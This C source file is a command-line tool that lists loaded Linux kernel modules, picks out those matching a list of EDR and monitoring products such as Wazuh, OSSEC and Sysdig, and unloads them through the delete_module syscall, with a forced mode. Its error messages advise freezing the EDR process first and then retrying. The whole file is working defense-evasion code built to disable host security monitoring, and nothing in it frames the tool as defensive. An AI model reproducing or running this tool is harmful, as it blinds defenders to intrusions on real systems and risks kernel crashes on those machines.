#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>

#define KMOD_REMOVE_FORCE  O_TRUNC
#define KMOD_REMOVE_WAIT   O_NONBLOCK

static int delete_mod(const char *name, int flags)
{
    return (int)syscall(__NR_delete_module, name, (unsigned int)flags);
}

static void cmd_unload(const char *name, int force)
{
    int flags = force ? (O_NONBLOCK | KMOD_REMOVE_FORCE) : O_NONBLOCK;

    printf("[*] attempting to unload module '%s'%s\n",
           name, force ? " (FORCE - may panic)" : "");

    if (delete_mod(name, flags) == 0) {
        printf("[+] module '%s' unloaded\n", name);
        return;
    }

    switch (errno) {
    case EBUSY:
        fprintf(stderr,
            "[!] EBUSY: module is in use (refcnt > 0)\n"
            "    try: --force  (risk: kernel panic if active hooks remain)\n"
            "    or:  first freeze the EDR process with cgroup_freeze\n"
            "         then retry without --force\n");
        break;
    case EPERM:
        fprintf(stderr, "[!] EPERM: need CAP_SYS_MODULE (root)\n");
        break;
    case ENOENT:
        fprintf(stderr, "[!] ENOENT: module '%s' not loaded\n", name);
        break;
    case EWOULDBLOCK:
        fprintf(stderr,
            "[!] EWOULDBLOCK: module busy - retry after freezing the EDR\n");
        break;
    default:
        perror("delete_module");
    }
}

static const char *edr_patterns[] = {
    "edr_lsm_hook", "edr_kal", "edr_nf",
    "edr_delta", "edr_daemon_d", "edr_d_",
    "edr_e_", "edr_sensor_e", "edr_epsilon",
    "edr_theta", "edr_endpoint_t",
    "wazuh", "ossec",
    "sysdig", "scap",
    NULL
};

static int is_edr_module(const char *name)
{
    for (int i = 0; edr_patterns[i]; i++) {
        if (strstr(name, edr_patterns[i])) return 1;
    }
    return 0;
}

static void cmd_list(void)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) { perror("/proc/modules"); return; }

    char line[512], name[256];
    printf("  %-32s %-8s %-6s %s\n", "name", "size", "refcnt", "state");
    printf("  %s\n", "----------------------------------------------------------------------");
    while (fgets(line, sizeof(line), f)) {
        int refcnt;
        unsigned long size;
        char state[32];
        if (sscanf(line, "%255s %lu %d %*s %31s", name, &size, &refcnt, state) < 4)
            continue;
        int edr = is_edr_module(name);
        printf("  %-32s %-8lu %-6d %s%s\n",
               name, size, refcnt, state, edr ? "  <-- EDR" : "");
    }
    fclose(f);
}

static void cmd_hunt(void)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) { perror("/proc/modules"); return; }

    char line[512], name[256];
    int found = 0;
    printf("[*] scanning for known EDR modules:\n");
    while (fgets(line, sizeof(line), f)) {
        int refcnt;
        char state[32];
        if (sscanf(line, "%255s %*u %d %*s %31s", name, &refcnt, state) < 3) continue;
        if (is_edr_module(name)) {
            printf("  [!] %-32s refcnt=%-4d state=%s\n", name, refcnt, state);
            found++;
        }
    }
    fclose(f);
    if (!found) printf("  [*] no known EDR modules found\n");
}

static void cmd_info(const char *name)
{
    char path[256];
    char buf[512];
    FILE *f;

    snprintf(path, sizeof(path), "/sys/module/%s/version", name);
    f = fopen(path, "r");
    if (f) {
        fgets(buf, sizeof(buf), f); fclose(f);
        printf("  version:    %s", buf);
    }

    snprintf(path, sizeof(path), "/sys/module/%s/refcnt", name);
    f = fopen(path, "r");
    if (f) {
        fgets(buf, sizeof(buf), f); fclose(f);
        printf("  refcnt:     %s", buf);
    }

    snprintf(path, sizeof(path), "/sys/module/%s/holders", name);
    DIR *d = opendir(path);
    if (d) {
        struct dirent *de;
        printf("  holders:    ");
        while ((de = readdir(d))) {
            if (de->d_name[0] != '.') printf("%s ", de->d_name);
        }
        printf("\n");
        closedir(d);
    }

    snprintf(path, sizeof(path), "/sys/module/%s/srcversion", name);
    f = fopen(path, "r");
    if (f) {
        fgets(buf, sizeof(buf), f); fclose(f);
        printf("  srcversion: %s", buf);
    }

    char ftr[256];
    snprintf(ftr, sizeof(ftr), "/sys/kernel/tracing/enabled_functions");
    f = fopen(ftr, "r");
    if (!f) {
        snprintf(ftr, sizeof(ftr), "/sys/kernel/debug/tracing/enabled_functions");
        f = fopen(ftr, "r");
    }
    if (f) {
        char ln[512];
        int n = 0;
        while (fgets(ln, sizeof(ln), f)) n++;
        fclose(f);
        printf("  ftrace hooks (total in kernel): %d\n", n);
        printf("  [!] ftrace hooks from '%s' are removed when module unloads\n", name);
    }
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <list|hunt|info|unload>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        cmd_list();
    } else if (strcmp(argv[1], "hunt") == 0) {
        cmd_hunt();
    } else if (strcmp(argv[1], "info") == 0 && argc >= 3) {
        cmd_info(argv[2]);
    } else if (strcmp(argv[1], "unload") == 0 && argc >= 3) {
        int force = (argc >= 4 && strcmp(argv[3], "--force") == 0);
        cmd_unload(argv[2], force);
    } else {
        fprintf(stderr, "unknown: %s\n", argv[1]);
        return 1;
    }
    return 0;
}
